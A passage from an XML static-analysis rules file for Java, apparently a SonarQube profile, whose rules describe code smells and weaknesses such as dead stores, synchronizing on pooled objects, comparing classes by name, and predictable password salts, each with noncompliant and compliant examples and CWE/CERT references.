            &lt;code&gt;Object&lt;/code&gt; monitor methods.&lt;/p&gt;
            &lt;/blockquote&gt;
            &lt;p&gt;The purpose of implementing the &lt;code&gt;Condition&lt;/code&gt; interface is to gain access to
            its more nuanced &lt;code&gt;await&lt;/code&gt; methods. Therefore,
            calling the method &lt;code&gt;Object.wait(...)&lt;/code&gt; on a class implementing the &lt;code&gt;Condition&lt;/code&gt;
            interface is silly and confusing.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            final Lock lock = new ReentrantLock();
            final Condition notFull = lock.newCondition();
            ...
            notFull.wait();
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            final Lock lock = new ReentrantLock();
            final Condition notFull = lock.newCondition();
            ...
            notFull.await();
            &lt;/pre&gt;
        </description>
        <tag>suspicious</tag>
    </rule>

    <rule key='S1845' priority='BLOCKER'>
        <configKey>S1845</configKey>
        <name>Methods and field names should not be the same or differ only by capitalization</name>
        <description>
            &lt;p&gt;Looking at the set of methods in a class, including superclass methods, and finding two methods or
            fields that differ only by capitalization is
            confusing to users of the class. It is similarly confusing to have a method and a field which differ only in
            capitalization or a method and a field
            with exactly the same name and visibility.&lt;/p&gt;
            &lt;p&gt;In the case of methods, it may have been a mistake on the part of the original developer, who
            intended to override a superclass method, but instead
            added a new method with nearly the same name.&lt;/p&gt;
            &lt;p&gt;Otherwise, this situation simply indicates poor naming. Method names should be action-oriented, and
            thus contain a verb, which is unlikely in the
            case where both a method and a member have the same name (with or without capitalization differences).
            However, renaming a public method could be
            disruptive to callers. Therefore renaming the member is the recommended action.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class Car{

            public DriveTrain drive;

            public void tearDown(){...}

            public void drive() {...} // Noncompliant; duplicates field name
            }

            public class MyCar extends Car{
            public void teardown(){...} // Noncompliant; not an override. It it really what's intended?

            public void drivefast(){...}

            public void driveFast(){...} //Huh?
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class Car{

            private DriveTrain drive;

            public void tearDown(){...}

            public void drive() {...} // field visibility reduced
            }

            public class MyCar extends Car{
            @Override
            public void tearDown(){...}

            public void drivefast(){...}

            public void driveReallyFast(){...}

            }
            &lt;/pre&gt;
        </description>
        <tag>confusing</tag>
    </rule>

    <rule key='S1849' priority='MAJOR'>
        <configKey>S1849</configKey>
        <name>&quot;Iterator.hasNext()&quot; should not call &quot;Iterator.next()&quot;</name>
        <description>
            &lt;p&gt;Calling &lt;code&gt;Iterator.hasNext()&lt;/code&gt; is not supposed to have any side effects, and
            therefore should not change the state of the iterator.
            &lt;code&gt;Iterator.next()&lt;/code&gt; advances the iterator by one item. So calling it inside &lt;code&gt;Iterator.hasNext()&lt;/code&gt;,
            breaks the
            &lt;code&gt;hasNext()&lt;/code&gt; contract, and will lead to unexpected behavior in production.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class FibonacciIterator implements Iterator&amp;lt;Integer&amp;gt;{
            ...
            @Override
            public boolean hasNext() {
            if(next() != null) {
            return true;
            }
            return false;
            }
            ...
            }
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S1854' priority='MAJOR'>
        <configKey>S1854</configKey>
        <name>Unused assignments should be removed</name>
        <description>
            &lt;p&gt;A dead store happens when a local variable is assigned a value that is not read by any subsequent
            instruction. Calculating or retrieving a value
            only to then overwrite it or throw it away, could indicate a serious error in the code. Even if it's not an
            error, it is at best a waste of resources.
            Therefore all calculated values should be used.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            i = a + b; // Noncompliant; calculation result not used before value is overwritten
            i = compute();
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            i = a + b;
            i += compute();
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;This rule ignores initializations to -1, 0, 1, &lt;code&gt;null&lt;/code&gt;, &lt;code&gt;true&lt;/code&gt;,
            &lt;code&gt;false&lt;/code&gt; and &lt;code&gt;&quot;&quot;&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/563.html&quot;&gt;MITRE, CWE-563&lt;/a&gt;
            - Assignment to Variable without Use ('Unused Variable') &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/39UxBQ&quot;&gt;CERT, MSC13-C.&lt;/a&gt; -
            Detect and remove unused values &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/9DZGBQ&quot;&gt;CERT, MSC56-J.&lt;/a&gt; -
            Detect and remove superfluous code and values &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
        <tag>unused</tag>
    </rule>

    <rule key='S1858' priority='MINOR'>
        <configKey>S1858</configKey>
        <name>&quot;toString()&quot; should never be called on a String object</name>
        <description>
            &lt;p&gt;Invoking a method designed to return a string representation of an object which is already a string
            is a waste of keystrokes. This redundant
            construction may be optimized by the compiler, but will be confusing in the meantime.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            String message = &quot;hello world&quot;;
            System.out.println(message.toString()); // Noncompliant;
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            String message = &quot;hello world&quot;;
            System.out.println(message);
            &lt;/pre&gt;
        </description>
        <tag>clumsy</tag>
        <tag>finding</tag>
    </rule>

    <rule key='S1860' priority='MAJOR'>
        <configKey>S1860</configKey>
        <name>Synchronization should not be done on instances of value-based classes</name>
        <description>
            &lt;p&gt;Objects which are pooled and potentially reused should not be used for synchronization. If they
            are, it can cause unrelated threads to deadlock
            with unhelpful stacktraces. Specifically, &lt;code&gt;String&lt;/code&gt; literals, and boxed primitives
            such as Integers should not be used as lock objects
            because they are pooled and reused. The story is even worse for &lt;code&gt;Boolean&lt;/code&gt; objects,
            because there could possibly be only two instances of
            &lt;code&gt;Boolean&lt;/code&gt;, &lt;code&gt;Boolean.TRUE&lt;/code&gt; and &lt;code&gt;Boolean.FALSE&lt;/code&gt;
            and every class that uses a Boolean will be referring to one of the
            two.&lt;/p&gt;
            &lt;p&gt;Here is the list of types which shouldn't be used for synchronization:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; The primitive wrapper classes in java.lang; &lt;/li&gt;
            &lt;li&gt; The class java.lang.Runtime.Version; &lt;/li&gt;
            &lt;li&gt; The &quot;optional&quot; classes in java.util: Optional, OptionalInt, OptionalLong, and
            OptionalDouble; &lt;/li&gt;
            &lt;li&gt; Many classes in the java.time API: Instant, LocalDate, LocalTime, LocalDateTime, ZonedDateTime,
            ZoneId, OffsetTime, OffsetDateTime, ZoneOffset,
            Duration, Period, Year, YearMonth, and MonthDay, and, in java.time.chrono: MinguoDate, HijrahDate,
            JapaneseDate, and ThaiBuddhistDate; &lt;/li&gt;
            &lt;li&gt; The interface java.lang.ProcessHandle and its implementation classes; &lt;/li&gt;
            &lt;li&gt; The implementation classes of the collection factories in java.util: List.of, List.copyOf,
            Set.of, Set.copyOf, Map.of, Map.copyOf,
            Map.ofEntries, and Map.entry. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            private static final Boolean bLock = Boolean.FALSE;
            private static final Integer iLock = Integer.valueOf(0);
            private static final String sLock = &quot;LOCK&quot;;
            private static final List&amp;lt;String&amp;gt; listLock = List.of(&quot;a&quot;, &quot;b&quot;, &quot;c&quot;,
            &quot;d&quot;);

            public void doSomething() {

            synchronized(bLock) { // Noncompliant
            // ...
            }
            synchronized(iLock) { // Noncompliant
            // ...
            }
            synchronized(sLock) { // Noncompliant
            // ...
            }
            synchronized(listLock) { // Noncompliant
            // ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            private static final Object lock1 = new Object();
            private static final Object lock2 = new Object();
            private static final Object lock3 = new Object();
            private static final Object lock4 = new Object();

            public void doSomething() {

            synchronized(lock1) {
            // ...
            }
            synchronized(lock2) {
            // ...
            }
            synchronized(lock3) {
            // ...
            }
            synchronized(lock4) {
            // ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/1zdGBQ&quot;&gt;CERT, LCK01-J.&lt;/a&gt; -
            Do not synchronize on objects that may be reused &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://openjdk.java.net/jeps/390&quot;&gt;JEP-390.&lt;/a&gt; - JEP 390:
            Warnings for Value-Based Classes &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>multi-threading</tag>
    </rule>

    <rule key='S1862' priority='MAJOR'>
        <configKey>S1862</configKey>
        <name>Related &quot;if/else if&quot; statements should not have the same condition</name>
        <description>
            &lt;p&gt;A chain of &lt;code&gt;if&lt;/code&gt;/&lt;code&gt;else if&lt;/code&gt; statements is evaluated
            from top to bottom. At most, only one branch will be executed: the first
            one with a condition that evaluates to &lt;code&gt;true&lt;/code&gt;. &lt;/p&gt;
            &lt;p&gt;Therefore, duplicating a condition automatically leads to dead code. Usually, this is due to a
            copy/paste error. At best, it's simply dead code and
            at worst, it's a bug that is likely to induce further bugs as the code is maintained, and obviously it could
            lead to unexpected behavior. &lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            if (param == 1)
            openWindow();
            else if (param == 2)
            closeWindow();
            else if (param == 1) // Noncompliant
            moveWindowToTheBackground();
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            if (param == 1)
            openWindow();
            else if (param == 2)
            closeWindow();
            else if (param == 3)
            moveWindowToTheBackground();
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/5dUxBQ&quot;&gt;CERT, MSC12-C.&lt;/a&gt; -
            Detect and remove code that has no effect or is never executed
            &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>pitfall</tag>
        <tag>unused</tag>
    </rule>

    <rule key='S1871' priority='MAJOR'>
        <configKey>S1871</configKey>
        <name>Two branches in a conditional structure should not have exactly the same implementation</name>
        <description>
            &lt;p&gt;Having two &lt;code&gt;cases&lt;/code&gt; in a &lt;code&gt;switch&lt;/code&gt; statement or two
            branches in an &lt;code&gt;if&lt;/code&gt; chain with the same implementation is at
            best duplicate code, and at worst a coding error. If the same logic is truly needed for both instances, then
            in an &lt;code&gt;if&lt;/code&gt; chain they should
            be combined, or for a &lt;code&gt;switch&lt;/code&gt;, one should fall through to the other. &lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            switch (i) {
            case 1:
            doFirstThing();
            doSomething();
            break;
            case 2:
            doSomethingDifferent();
            break;
            case 3: // Noncompliant; duplicates case 1's implementation
            doFirstThing();
            doSomething();
            break;
            default:
            doTheRest();
            }

            if (a &amp;gt;= 0 &amp;amp;&amp;amp; a &amp;lt; 10) {
            doFirstThing();
            doTheThing();
            }
            else if (a &amp;gt;= 10 &amp;amp;&amp;amp; a &amp;lt; 20) {
            doTheOtherThing();
            }
            else if (a &amp;gt;= 20 &amp;amp;&amp;amp; a &amp;lt; 50) {
            doFirstThing();
            doTheThing(); // Noncompliant; duplicates first condition
            }
            else {
            doTheRest();
            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;Blocks in an &lt;code&gt;if&lt;/code&gt; chain that contain a single line of code are ignored, as
            are blocks in a &lt;code&gt;switch&lt;/code&gt; statement that contain a
            single line of code with or without a following &lt;code&gt;break&lt;/code&gt;.&lt;/p&gt;
            &lt;pre&gt;
            if (a == 1) {
            doSomething(); //no issue, usually this is done on purpose to increase the readability
            } else if (a == 2) {
            doSomethingElse();
            } else {
            doSomething();
            }
            &lt;/pre&gt;
            &lt;p&gt;But this exception does not apply to &lt;code&gt;if&lt;/code&gt; chains without &lt;code&gt;else&lt;/code&gt;-s,
            or to &lt;code&gt;switch&lt;/code&gt;-es without default clauses when
            all branches have the same single line of code. In case of &lt;code&gt;if&lt;/code&gt; chains with &lt;code&gt;else&lt;/code&gt;-s,
            or of &lt;code&gt;switch&lt;/code&gt;-es with default
            clauses, rule &lt;a href='/coding_rules#rule_key=java%3AS3923'&gt;S3923&lt;/a&gt; raises a bug. &lt;/p&gt;
            &lt;pre&gt;
            if (a == 1) {
            doSomething(); //Noncompliant, this might have been done on purpose but probably not
            } else if (a == 2) {
            doSomething();
            }
            &lt;/pre&gt;
        </description>
        <tag>design</tag>
        <tag>suspicious</tag>
    </rule>

    <rule key='S1872' priority='MAJOR'>
        <configKey>S1872</configKey>
        <name>Classes should not be compared by name</name>
        <description>
            &lt;p&gt;There is no requirement that class names be unique, only that they be unique within a package.
            Therefore trying to determine an object's type based
            on its class name is an exercise fraught with danger. One of those dangers is that a malicious user will
            send objects of the same name as the trusted
            class and thereby gain trusted access.&lt;/p&gt;
            &lt;p&gt;Instead, the &lt;code&gt;instanceof&lt;/code&gt; operator or the &lt;code&gt;Class.isAssignableFrom()&lt;/code&gt;
            method should be used to check the object's underlying
            type.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            package computer;
            class Pear extends Laptop { ... }

            package food;
            class Pear extends Fruit { ... }

            class Store {

            public boolean hasSellByDate(Object item) {
            if (&quot;Pear&quot;.equals(item.getClass().getSimpleName())) { // Noncompliant
            return true; // Results in throwing away week-old computers
            }
            return false;
            }

            public boolean isList(Class&amp;lt;T&amp;gt; valueClass) {
            if (List.class.getName().equals(valueClass.getName())) { // Noncompliant
            return true;
            }
            return false;
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            class Store {

            public boolean hasSellByDate(Object item) {
            if (item instanceof food.Pear) {
            return true;
            }
            return false;
            }

            public boolean isList(Class&amp;lt;T&amp;gt; valueClass) {
            if (valueClass.isAssignableFrom(List.class)) {
            return true;
            }
            return false;
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/486.html&quot;&gt;MITRE, CWE-486&lt;/a&gt;
            - Comparison of Classes by Name &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/eDdGBQ&quot;&gt;CERT, OBJ09-J.&lt;/a&gt; -
            Compare classes and not class names &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
    </rule>

    <rule key='S1874' priority='MINOR'>
        <configKey>S1874</configKey>
        <name>&quot;@Deprecated&quot; code should not be used</name>
        <description>
            &lt;p&gt;Once deprecated, classes, and interfaces, and their members should be avoided, rather than used,
            inherited or extended. Deprecation is a warning
            that the class or interface has been superseded, and will eventually be removed. The deprecation period
            allows you to make a smooth transition away
            from the aging, soon-to-be-retired technology.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            /**
            * @deprecated As of release 1.3, replaced by {@link #Fee}
            */
            @Deprecated
            public class Fum { ... }

            public class Foo {
            /**
            * @deprecated As of release 1.7, replaced by {@link #doTheThingBetter()}
            */
            @Deprecated
            public void doTheThing() { ... }

            public void doTheThingBetter() { ... }
            }

            public class Bar extends Foo {
            public void doTheThing() { ... } // Noncompliant; don't override a deprecated method or explicitly mark it
            as @Deprecated
            }

            public class Bar extends Fum { // Noncompliant; Fum is deprecated

            public void myMethod() {
            Foo foo = new Foo(); // okay; the class isn't deprecated
            foo.doTheThing(); // Noncompliant; doTheThing method is deprecated
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/477.html&quot;&gt;MITRE, CWE-477&lt;/a&gt;
            - Use of Obsolete Functions &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/6TdGBQ&quot;&gt;CERT, MET02-J.&lt;/a&gt; -
            Do not use deprecated or obsolete classes or methods &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
        <tag>obsolete</tag>
    </rule>

    <rule key='S1905' priority='MINOR'>
        <configKey>S1905</configKey>
        <name>Redundant casts should not be used</name>
        <description>
            &lt;p&gt;Unnecessary casting expressions make the code harder to read and understand.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public void example() {
            for (Foo obj : (List&amp;lt;Foo&amp;gt;) getFoos()) { // Noncompliant; cast unnecessary because List&amp;lt;Foo&amp;gt;
            is what's returned
            //...
            }
            }

            public List&amp;lt;Foo&amp;gt; getFoos() {
            return this.foos;
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public void example() {
            for (Foo obj : getFoos()) {
            //...
            }
            }

            public List&amp;lt;Foo&amp;gt; getFoos() {
            return this.foos;
            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;Casting may be required to distinguish the method to call in the case of overloading:&lt;/p&gt;
            &lt;pre&gt;
            class A {}
            class B extends A{}
            class C {
            void fun(A a){}
            void fun(B b){}

            void foo() {
            B b = new B();
            fun(b);
            fun((A) b); //call the first method so cast is not redundant.
            }

            }
            &lt;/pre&gt;
        </description>
        <tag>clumsy</tag>
        <tag>redundant</tag>
    </rule>

    <rule key='S1940' priority='MINOR'>
        <configKey>S1940</configKey>
        <name>Boolean checks should not be inverted</name>
        <description>
            &lt;p&gt;It is needlessly complex to invert the result of a boolean comparison. The opposite comparison
            should be made instead.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            if ( !(a == 2)) { ...} // Noncompliant
            boolean b = !(i &amp;lt; 10); // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            if (a != 2) { ...}
            boolean b = (i &amp;gt;= 10);
            &lt;/pre&gt;
        </description>
        <tag>pitfall</tag>
    </rule>

    <rule key='S1948' priority='CRITICAL'>
        <configKey>S1948</configKey>
        <name>Fields in a &quot;Serializable&quot; class should either be transient or serializable</name>
        <description>
            &lt;p&gt;Fields in a &lt;code&gt;Serializable&lt;/code&gt; class must themselves be either &lt;code&gt;Serializable&lt;/code&gt;
            or &lt;code&gt;transient&lt;/code&gt; even if the class is
            never explicitly serialized or deserialized. For instance, under load, most J2EE application frameworks
            flush objects to disk, and an allegedly
            &lt;code&gt;Serializable&lt;/code&gt; object with non-transient, non-serializable data members could cause
            program crashes, and open the door to attackers. In
            general a &lt;code&gt;Serializable&lt;/code&gt; class is expected to fulfil its contract and not have an
            unexpected behaviour when an instance is serialized. &lt;/p&gt;
            &lt;p&gt;This rule raises an issue on non-&lt;code&gt;Serializable&lt;/code&gt; fields, and on collection
            fields when they are not &lt;code&gt;private&lt;/code&gt; (because they
            could be assigned non-&lt;code&gt;Serializable&lt;/code&gt; values externally), and when they are assigned
            non-&lt;code&gt;Serializable&lt;/code&gt; types within the
            class.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class Address {
            //...
            }

            public class Person implements Serializable {
            private static final long serialVersionUID = 1905122041950251207L;

            private String name;
            private Address address; // Noncompliant; Address isn't serializable
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class Address implements Serializable {
            private static final long serialVersionUID = 2405172041950251807L;
            }

            public class Person implements Serializable {
            private static final long serialVersionUID = 1905122041950251207L;

            private String name;
            private Address address;
            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;The alternative to making all members &lt;code&gt;serializable&lt;/code&gt; or &lt;code&gt;transient&lt;/code&gt;
            is to implement special methods which take on the
            responsibility of properly serializing and de-serializing the object. This rule ignores classes which
            implement the following methods:&lt;/p&gt;
            &lt;pre&gt;
            private void writeObject(java.io.ObjectOutputStream out)
            throws IOException
            private void readObject(java.io.ObjectInputStream in)
            throws IOException, ClassNotFoundException;
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/594.html&quot;&gt;MITRE, CWE-594&lt;/a&gt;
            - Saving Unserializable Objects to Disk &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://docs.oracle.com/javase/6/docs/api/java/io/Serializable.html&quot;&gt;Oracle
            Java 6, Serializable&lt;/a&gt; &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://docs.oracle.com/javase/7/docs/api/java/io/Serializable.html&quot;&gt;Oracle
            Java 7, Serializable&lt;/a&gt; &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>serialization</tag>
    </rule>

    <rule key='S1989' priority='MINOR'>
        <configKey>S1989</configKey>
        <name>Exceptions should not be thrown from servlet methods</name>
        <description>
            &lt;p&gt;Even though the signatures for methods in a servlet include &lt;code&gt;throws IOException,
            ServletException&lt;/code&gt;, it's a bad idea to let such
            exceptions be thrown. Failure to catch exceptions in a servlet could leave a system in a vulnerable state,
            possibly resulting in denial-of-service
            attacks, or the exposure of sensitive information because when a servlet throws an exception, the servlet
            container typically sends debugging
            information back to the user. And that information could be very valuable to an attacker. &lt;/p&gt;
            &lt;p&gt;This rule checks all exceptions in methods named &quot;do*&quot; are explicitly handled in servlet
            classes.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public void doGet(HttpServletRequest request, HttpServletResponse response)
            throws IOException, ServletException {
            String ip = request.getRemoteAddr();
            InetAddress addr = InetAddress.getByName(ip); // Noncompliant; getByName(String) throws UnknownHostException
            //...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public void doGet(HttpServletRequest request, HttpServletResponse response)
            throws IOException, ServletException {
            try {
            String ip = request.getRemoteAddr();
            InetAddress addr = InetAddress.getByName(ip);
            //...
            }
            catch (UnknownHostException uhex) {
            //...
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure&quot;&gt;OWASP
            Top 10 2017 Category A3&lt;/a&gt; - Sensitive Data Exposure
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/600.html&quot;&gt;MITRE, CWE-600&lt;/a&gt;
            - Uncaught Exception in Servlet &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/-zZGBQ&quot;&gt;CERT, ERR01-J.&lt;/a&gt; -
            Do not allow exceptions to expose sensitive information &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
        <tag>error-handling</tag>
        <tag>owasp-a3</tag>
        <securityStandards>
            <cwe>600</cwe>
            <OWASP>A3</OWASP>
        </securityStandards>
    </rule>

    <rule key='S1994' priority='CRITICAL'>
        <configKey>S1994</configKey>
        <name>&quot;for&quot; loop increment clauses should modify the loops' counters</name>
        <description>
            &lt;p&gt;It can be extremely confusing when a &lt;code&gt;for&lt;/code&gt; loop's counter is incremented
            outside of its increment clause. In such cases, the increment
            should be moved to the loop's increment clause if at all possible.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            for (i = 0; i &amp;lt; 10; j++) { // Noncompliant
            // ...
            i++;
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            for (i = 0; i &amp;lt; 10; i++, j++) {
            // ...
            }
            &lt;/pre&gt;
            &lt;p&gt;Or &lt;/p&gt;
            &lt;pre&gt;
            for (i = 0; i &amp;lt; 10; i++) {
            // ...
            j++;
            }
            &lt;/pre&gt;
        </description>
        <tag>confusing</tag>
    </rule>

    <rule key='S2053' priority='CRITICAL'>
        <configKey>S2053</configKey>
        <name>Hashes should include an unpredictable salt</name>
        <description>
            &lt;p&gt;In cryptography, a &quot;salt&quot; is an extra piece of data which is included when hashing a
            password. This makes &lt;code&gt;rainbow-table attacks&lt;/code&gt; more
            difficult. Using a cryptographic hash function without an unpredictable salt increases the likelihood that
            an attacker could successfully find the
            hash value in databases of precomputed hashes (called &lt;code&gt;rainbow-tables&lt;/code&gt;).&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when a hashing function which has been specifically designed for hashing
            passwords, such as &lt;code&gt;PBKDF2&lt;/code&gt;, is used
            with a non-random, reused or too short salt value. It does not raise an issue on base hashing algorithms
            such as &lt;code&gt;sha1&lt;/code&gt; or &lt;code&gt;md5&lt;/code&gt;
            as they should not be used to hash passwords.&lt;/p&gt;
            &lt;h2&gt;Recommended Secure Coding Practices&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; Use hashing functions generating their own secure salt or generate a secure random value of at
            least 16 bytes. &lt;/li&gt;
            &lt;li&gt; The salt should be unique by user password. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;p&gt;Below, the hashed password use a predictable salt:&lt;/p&gt;
            &lt;pre&gt;
            byte[] salt = &quot;notrandom&quot;.getBytes();

            PBEParameterSpec cipherSpec = new PBEParameterSpec(salt, 10000); // Noncompliant, predictable salt
            PBEKeySpec spec = new PBEKeySpec(chars, salt, 10000, 256); // Noncompliant, predictable salt
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;p&gt;Use &lt;code&gt;java.security.SecureRandom&lt;/code&gt; to generate an unpredictable salt:&lt;/p&gt;
            &lt;pre&gt;
            SecureRandom random = new SecureRandom();
            byte[] salt = new byte[16];
            random.nextBytes(salt);

            PBEParameterSpec cipherSpec = new PBEParameterSpec(salt, 10000); // Compliant
            PBEKeySpec spec = new PBEKeySpec(chars, salt, 10000, 256); // Compliant
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure&quot;&gt;OWASP
            Top 10 2017 Category A3&lt;/a&gt; - Sensitive Data Exposure
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/759.html&quot;&gt;MITRE, CWE-759&lt;/a&gt;
            - Use of a One-Way Hash without a Salt &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/760.html&quot;&gt;MITRE, CWE-760&lt;/a&gt;
            - Use of a One-Way Hash with a Predictable Salt &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.sans.org/top25-software-errors/#cat3&quot;&gt;SANS Top 25&lt;/a&gt;
            - Porous Defenses &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>owasp-a3</tag>
        <tag>sans-top25-porous</tag>
        <securityStandards>
            <OWASP>A3</OWASP>
        </securityStandards>
    </rule>

    <rule key='S2055' priority='MINOR'>
        <configKey>S2055</configKey>
        <name>The non-serializable super class of a &quot;Serializable&quot; class should have a no-argument
            constructor
        </name>
        <description>
            &lt;p&gt;When a &lt;code&gt;Serializable&lt;/code&gt; object has a non-serializable ancestor in its
            inheritance chain, object deserialization (re-instantiating the
            object from file) starts at the first non-serializable class, and proceeds down the chain, adding the
            properties of each subsequent child class, until
            the final object has been instantiated. &lt;/p&gt;
            &lt;p&gt;In order to create the non-serializable ancestor, its no-argument constructor is called. Therefore
            the non-serializable ancestor of a
            &lt;code&gt;Serializable&lt;/code&gt; class must have a no-arg constructor. Otherwise the class is &lt;code&gt;Serializable&lt;/code&gt;
            but not deserializable.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class Fruit {
            private Season ripe;

            public Fruit (Season ripe) {...}
            public void setRipe(Season ripe) {...}
            public Season getRipe() {...}
            }

            public class Raspberry extends Fruit
            implements Serializable { // Noncompliant; nonserializable ancestor doesn't have no-arg constructor
            private static final long serialVersionUID = 1;

            private String variety;

            public Raspberry(Season ripe, String variety) { ...}
            public void setVariety(String variety) {...}
            public String getVarity() {...}
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class Fruit {
            private Season ripe;

